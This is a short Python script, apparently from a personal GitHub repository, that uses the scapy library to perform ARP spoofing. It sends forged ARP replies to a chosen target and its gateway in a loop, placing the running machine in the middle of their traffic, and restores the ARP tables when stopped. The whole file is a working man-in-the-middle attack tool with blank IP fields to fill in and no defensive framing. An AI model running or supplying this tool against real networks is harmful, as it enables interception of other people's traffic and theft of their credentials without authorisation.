# Javi Ferrándiz | 13/02/2023 | github - https://github.com/javisys
import scapy.all as scapy
import time

def get_mac(ip):
    arp_req = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast / arp_req
    answered_list = scapy.srp(arp_req_broadcast, timeout = 5, verbose = False)[0]
    
    return answered_list[0][1].hwsrc

#print(scapy.ls(scapy.ARP))

def spoofing(target_ip, spoof_ip):
    paquete = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
    
    scapy.send(paquete, verbose = False)

def restart(destination_ip, src_ip):
    destination_mac = get_mac(destination_ip)
    src_mac = get_mac(src_ip)
    paquete = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = src_ip, hwsrc = src_mac)
    scapy.send(paquete, verbose = False)



target_ip = "" # Enter the target IP
gateway_ip = "" # Enter the gateway's IP


try:
	sent_packets_count = 0
	while True:
		spoofing(target_ip, gateway_ip)
		spoofing(gateway_ip, target_ip)
		sent_packets_count = sent_packets_count + 2
		print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
		time.sleep(2) # Waits for two seconds

except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restart(target_ip, gateway_ip)
    restart(gateway_ip, target_ip)
    print("[*] ARP Spoof Stopped")


